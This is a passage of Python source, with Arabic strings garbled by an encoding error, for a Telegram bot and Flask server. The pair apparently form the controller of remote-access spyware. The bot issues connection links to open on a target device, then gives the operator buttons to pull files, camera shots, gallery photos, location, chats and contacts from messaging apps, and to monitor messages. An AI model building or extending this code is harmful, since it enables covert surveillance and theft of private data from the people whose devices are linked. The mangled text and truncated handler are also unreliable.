2. Ø§ÙØªØ­ Ø§Ù„Ø±Ø§Ø¨Ø· Ø¹Ù„Ù‰ Ø§Ù„Ø¬Ù‡Ø§Ø² Ø§Ù„Ø°ÙŠ ØªØ±ÙŠØ¯ Ø§Ù„ØªØ­ÙƒÙ… Ø¨Ù‡
3. Ø¨Ø¹Ø¯ Ø§Ù„Ø±Ø¨Ø·ØŒ ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø£Ø²Ø±Ø§Ø± Ù„Ù„ØªØ­ÙƒÙ… ÙÙŠ Ø§Ù„Ø¬Ù‡Ø§Ø²

ğŸ“ Ø§Ø³ØªØ¹Ø±Ø§Ø¶ Ø§Ù„Ù…Ù„ÙØ§Øª - Ø§Ø³ØªØ¹Ø±Ø§Ø¶ Ù…Ù„ÙØ§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²
ğŸ“¥ ØªÙ†Ø²ÙŠÙ„ Ù…Ù„Ù - ØªÙ†Ø²ÙŠÙ„ Ù…Ù„Ù Ù…Ù† Ø§Ù„Ø¬Ù‡Ø§Ø²
ğŸ“¤ Ø±ÙØ¹ Ù…Ù„Ù - Ø±ÙØ¹ Ù…Ù„Ù Ø¥Ù„Ù‰ Ø§Ù„Ø¬Ù‡Ø§Ø²
ğŸ“¸ Ø³Ø­Ø¨ ØµÙˆØ± - Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ ØµÙˆØ± Ù…Ù† ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø¬Ù‡Ø§Ø²
ğŸ–¼ï¸ Ù…Ø¹Ø±Ø¶ Ø§Ù„ØµÙˆØ± - Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ ØµÙˆØ± Ù…Ù† Ù…Ø¹Ø±Ø¶ Ø§Ù„Ø¬Ù‡Ø§Ø²
ğŸ“ Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬Ù‡Ø§Ø² - Ù…Ø¹Ø±ÙØ© Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬Ù‡Ø§Ø² Ø§Ù„Ø­Ø§Ù„ÙŠ
ğŸ“± Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª - Ø³Ø­Ø¨ Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù† Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª (ØµÙˆØ±ØŒ Ù…Ø­Ø§Ø¯Ø«Ø§ØªØŒ Ø¬Ù‡Ø§Øª Ø§ØªØµØ§Ù„)
    """
    update.message.reply_text(help_text, reply_markup=main_keyboard)

def create_link_button_handler(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    token = create_device_for_user(user_id)
    server_url = os.environ.get('SERVER_URL', 'http://127.0.0.1:5000')
    connect_url = f"{server_url}/connect/{token}"
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE devices SET connection_url=? WHERE token=?", (connect_url, token))
    conn.commit()
    conn.close()

    text = f"âœ… ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ Ø±Ø§Ø¨Ø· Ø±Ø¨Ø·. Ø§Ø¶ØºØ· Ù„Ù†Ø³Ø®Ù‡ ÙˆØ§Ø±Ø³Ø§Ù„Ù‡ Ø¹Ù„Ù‰ Ø¬Ù‡Ø§Ø²Ùƒ:\n{connect_url}"
    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton('Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø· (Ø§ÙØªØ­Ù‡ Ø¹Ù„Ù‰ Ø¬Ù‡Ø§Ø²Ùƒ)', url=connect_url),
        InlineKeyboardButton('Ø§Ø±Ø³Ù„ Ù„ÙŠ Ø§Ù„Ø±Ø§Ø¨Ø· Ù‡Ù†Ø§', callback_data=f'action:{token}:copy_link')
    ],[
        InlineKeyboardButton('ğŸ“ Ø§Ø³ØªØ¹Ø±Ø§Ø¶ Ø§Ù„Ù…Ù„ÙØ§Øª', callback_data=f'storage:{token}:browse'),
        InlineKeyboardButton('ğŸ“¥ ØªÙ†Ø²ÙŠÙ„ Ù…Ù„Ù', callback_data=f'storage:{token}:download')
    ],[
        InlineKeyboardButton('ğŸ“¤ Ø±ÙØ¹ Ù…Ù„Ù', callback_data=f'storage:{token}:upload'),
        InlineKeyboardButton('ğŸ“¸ ÙƒØ§Ù…ÙŠØ±Ø§', callback_data=f'action:{token}:camera')
    ],[
        InlineKeyboardButton('ğŸ–¼ï¸ Ù…Ø¹Ø±Ø¶ Ø§Ù„ØµÙˆØ±', callback_data=f'action:{token}:gallery')
    ],[
        InlineKeyboardButton('ğŸ“± Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª', callback_data=f'apps:{token}:menu')
    ]])
    update.message.reply_text(text, reply_markup=kb)

def apps_data_handler(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    devices = get_user_devices(user_id)
    
    if not devices:
        update.message.reply_text("Ù„Ø§ ØªÙˆØ¬Ø¯ Ø£Ø¬Ù‡Ø²Ø© Ù…Ø³Ø¬Ù„Ø© Ù„Ø¯ÙŠÙƒ. Ø£Ù†Ø´Ø¦ Ø±Ø§Ø¨Ø· Ø±Ø¨Ø· Ø£ÙˆÙ„Ø§Ù‹.")
        return
    
    # Ù†Ø³ØªØ®Ø¯Ù… Ø§Ù„Ø¬Ù‡Ø§Ø² Ø§Ù„Ø£ÙˆÙ„ (ÙŠÙ…ÙƒÙ† ØªØ¹Ø¯ÙŠÙ„ Ù‡Ø°Ø§ Ù„Ø§Ø®ØªÙŠØ§Ø± Ø¬Ù‡Ø§Ø² Ù…Ø­Ø¯Ø¯)
    token = devices[0][1]
    
    kb = create_apps_keyboard(token)
    update.message.reply_text("Ø§Ø®ØªØ± Ù…Ù† Ø§Ù„Ù‚Ø§Ø¦Ù…Ø©:", reply_markup=kb)

def devices_cmd(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    rows = get_user_devices(user_id)
    if not rows:
        update.message.reply_text("Ù„Ø§ ØªÙˆØ¬Ø¯ Ø£Ø¬Ù‡Ø²Ø© Ù…Ø³Ø¬Ù„Ø© Ù„Ø¯ÙŠÙƒ.", reply_markup=main_keyboard)
        return
    text = "ğŸ“± Ø£Ø¬Ù‡Ø²ØªÙƒ:\n\n"
    for r in rows:
        dev_id, token, status, created_at = r
        text += f"Token: {token[:16]}... | status: {status} | created: {created_at}\n"
    update.message.reply_text(text, reply_markup=main_keyboard)

def callback_query(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    data = query.data
    
    if data.startswith('storage:'):
        try:
            _, token, action = data.split(':', 2)
        except ValueError:
            query.edit_message_text('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª')
            return
        
        if action == 'browse':
            context.user_data['awaiting_browse_path'] = token
            query.edit_message_text('ğŸ“ Ø£Ø¯Ø®Ù„ Ø§Ù„Ù…Ø³Ø§Ø± Ø§Ù„Ø°ÙŠ ØªØ±ÙŠØ¯ Ø§Ø³ØªØ¹Ø±Ø§Ø¶Ù‡ (Ø§ØªØ±ÙƒÙ‡ ÙØ§Ø±ØºÙ‹Ø§ Ù„Ù„Ù…Ø³Ø§Ø± Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ):')
        
        elif action == 'download':
            context.user_data['awaiting_download_path'] = token
            query.edit_message_text('ğŸ“¥ Ø£Ø¯Ø®Ù„ Ù…Ø³Ø§Ø± Ø§Ù„Ù…Ù„Ù Ø§Ù„Ø°ÙŠ ØªØ±ÙŠØ¯ ØªÙ†Ø²ÙŠÙ„Ù‡:')
        
        elif action == 'upload':
            context.user_data['awaiting_upload_path'] = token
            query.edit_message_text('ğŸ“¤ Ø£Ø¯Ø®Ù„ Ø§Ù„Ù…Ø³Ø§Ø± Ø§Ù„Ø°ÙŠ ØªØ±ÙŠØ¯ Ø±ÙØ¹ Ø§Ù„Ù…Ù„Ù Ø¥Ù„ÙŠÙ‡ (Ø§ØªØ±ÙƒÙ‡ ÙØ§Ø±ØºÙ‹Ø§ Ù„Ù„Ù…Ø³Ø§Ø± Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ):')
    
    elif data.startswith('action:'):
        try:
            _, token, action = data.split(':', 2)
        except ValueError:
            query.edit_message_text('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª')
            return
        
        if action == 'camera':
            # Ø¹Ø±Ø¶ Ø®ÙŠØ§Ø±Ø§Øª Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
            camera_keyboard = InlineKeyboardMarkup([[
                InlineKeyboardButton('ÙƒØ§Ù…ÙŠØ±Ø§ Ø£Ù…Ø§Ù…ÙŠØ©', callback_data=f'action:{token}:front_camera'),
                InlineKeyboardButton('ÙƒØ§Ù…ÙŠØ±Ø§ Ø®Ù„ÙÙŠØ©', callback_data=f'action:{token}:back_camera')
            ]])
            query.edit_message_text('Ø§Ø®ØªØ± Ù†ÙˆØ¹ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§:', reply_markup=camera_keyboard)
        elif action == 'front_camera':
            resp = app.test_client().post(f"/request_front_camera/{token}")
            txt = json.loads(resp.data.decode()).get('message','')
            query.edit_message_text(f"{txt}")
        elif action == 'back_camera':
            resp = app.test_client().post(f"/request_back_camera/{token}")
            txt = json.loads(resp.data.decode()).get('message','')
            query.edit_message_text(f"{txt}")
        elif action == 'gallery':
            resp = app.test_client().post(f"/request_gallery/{token}")
            txt = json.loads(resp.data.decode()).get('message','')
            query.edit_message_text(f"{txt}")
        elif action == 'get_location':
            resp = app.test_client().post(f"/request_get_location/{token}")
            txt = json.loads(resp.data.decode()).get('message','')
            query.edit_message_text(f"{txt}")
        elif action == 'send_message':
            context.user_data['awaiting_msg_for_token'] = token
            query.edit_message_text('âœï¸ Ø§ÙƒØªØ¨ Ø§Ù„Ø¢Ù† Ø§Ù„Ù†Øµ Ø§Ù„Ø°ÙŠ ØªØ±ÙŠØ¯ Ø¥Ø±Ø³Ø§Ù„Ù‡ Ø¥Ù„Ù‰ Ø§Ù„Ø¬Ù‡Ø§Ø² (Ø³ØªØªÙ… Ù…Ø¹Ø§Ù„Ø¬ØªÙ‡ ØªÙ„Ù‚Ø§Ø¦ÙŠÙ‹Ø§).')
        elif action == 'call':
            resp = app.test_client().post(f"/request_call/{token}")
            txt = json.loads(resp.data.decode()).get('message','')
            query.edit_message_text(f"{txt}")
        elif action == 'delete_photo':
            resp = app.test_client().post(f"/delete_photo/{token}")
            txt = json.loads(resp.data.decode()).get('message','')
            query.edit_message_text(f"{txt}")
        elif action == 'copy_link':
            dev = get_device_by_token(token)
            if dev:
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute("SELECT connection_url FROM devices WHERE token=?", (token,))
                row = c.fetchone()
                conn.close()
                url = row[0] if row and row[0] else 'N/A'
                context.bot.send_message(chat_id=update.effective_user.id, text=f"Ø±Ø§Ø¨Ø· Ø§Ù„Ø±Ø¨Ø·:\n{url}")
                query.edit_message_text('ØªÙ… Ø§Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø§Ø¨Ø· Ù„Ùƒ ÙÙŠ Ø±Ø³Ø§Ù„Ø© Ù…Ù†ÙØµÙ„Ø©')
            else:
                query.edit_message_text('Ø¬Ù‡Ø§Ø² ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯')
        else:
            query.edit_message_text('Ø¥Ø¬Ø±Ø§Ø¡ ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')
    
    elif data.startswith('apps:'):
        try:
            _, token, action = data.split(':', 2)
        except ValueError:
            query.edit_message_text('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª')
            return
        
        if action == 'menu':
            # Ø¹Ø±Ø¶ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª
            kb = create_apps_keyboard(token)
            query.edit_message_text('Ø§Ø®ØªØ± Ù…Ù† Ø§Ù„Ù‚Ø§Ø¦Ù…Ø©:', reply_markup=kb)
    
    elif data.startswith('app:'):
        try:
            _, token, app_name, action = data.split(':', 3)
        except ValueError:
            query.edit_message_text('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª')
            return
        
        if action == 'photos':
            # Ø·Ù„Ø¨ ØµÙˆØ± Ø§Ù„ØªØ·Ø¨ÙŠÙ‚
            resp = app.test_client().post(f"/request_app_photos/{token}", 
                                         json={"app": app_name})
            result = json.loads(resp.data.decode())
            query.edit_message_text(f"âœ… ØªÙ… Ø·Ù„Ø¨ ØµÙˆØ± Ù…Ù† {app_name}")
            
        elif action == 'chats':
            # Ø·Ù„Ø¨ Ø§Ù„Ù…Ø­Ø§Ø¯Ø«Ø§Øª
            resp = app.test_client().post(f"/request_chats_data/{token}",
                                         json={"app": app_name})
            query.edit_message_text(f"âœ… ØªÙ… Ø·Ù„Ø¨ Ù…Ø­Ø§Ø¯Ø«Ø§Øª {app_name}")
            
        elif action == 'contacts':
            # Ø·Ù„Ø¨ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„
            resp = app.test_client().post(f"/request_contacts_app/{token}",
                                         json={"app": app_name})
            query.edit_message_text(f"âœ… ØªÙ… Ø·Ù„Ø¨ Ø¬Ù‡Ø§Øª Ø§ØªØµØ§Ù„ {app_name}")
            
        elif action == 'files':
            # Ø·Ù„Ø¨ Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø±Ø³Ù„Ø©
            resp = app.test_client().post(f"/request_shared_files/{token}",
                                         json={"app": app_name})
            query.edit_message_text(f"âœ… ØªÙ… Ø·Ù„Ø¨ Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø±Ø³Ù„Ø© ÙÙŠ {app_name}")
            
        elif action == 'monitor':
            # ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø©
            resp = app.test_client().post(f"/monitor_messages/{token}",
                                         json={"app": app_name, "enable": True})
            query.edit_message_text(f"âœ… ØªÙ… ØªÙØ¹ÙŠÙ„ Ù…Ø±Ø§Ù‚Ø¨Ø© {app_name}")

def text_commands(update: Update, context: CallbackContext):
    msg = update.message.text.strip()
    user_id = update.effective_user.id

    # Ù…Ø¹Ø§Ù„Ø¬Ø© Ø·Ù„Ø¨Ø§Øª Ø§Ø³ØªØ¹Ø±Ø§Ø¶ Ø§Ù„Ù…Ù„ÙØ§Øª
    if context.user_data.get('awaiting_browse_path'):
        token = context.user_data.pop('awaiting_browse_path')
        path = msg if msg else '/'
        resp = app.test_client().post(f"/browse_files/{token}", json={"path": path})
        # ... (Ø¨Ù‚ÙŠØ© Ø§Ù„ÙƒÙˆØ¯)

# --- ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¨ÙˆØª ---

if __name__ == '__main__':
    try:
        updater = Updater(token=TELEGRAM_BOT_TOKEN, use_context=True)
        dispatcher = updater.dispatcher
        
        # Ø¥Ø¶Ø§ÙØ© handlers
        dispatcher.add_handler(CommandHandler("start", start))
        dispatcher.add_handler(CommandHandler("help", help_cmd))
        dispatcher.add_handler(MessageHandler(Filters.regex('^ğŸ”— Ø£Ù†Ø´Ø£ Ø±Ø§Ø¨Ø· Ø±Ø¨Ø·$'), create_link_button_handler))
        dispatcher.add_handler(MessageHandler(Filters.regex('^ğŸ“‹ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©$'), devices_cmd))
        dispatcher.add_handler(MessageHandler(Filters.regex('^ğŸ“± Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª$'), apps_data_handler))
        dispatcher.add_handler(CallbackQueryHandler(callback_query))
        dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, text_commands))
        
        print("Telegram bot starting...")
        updater.start_polling()
        
        # ØªØ´ØºÙŠÙ„ Flask ÙÙŠ thread Ù…Ù†ÙØµÙ„
        flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False))
        flask_thread.daemon = True
        flask_thread.start()
        
        updater.idle()
    except Exception as e:
        print(f"Ø­Ø¯Ø« Ø®Ø·Ø£: {e}")
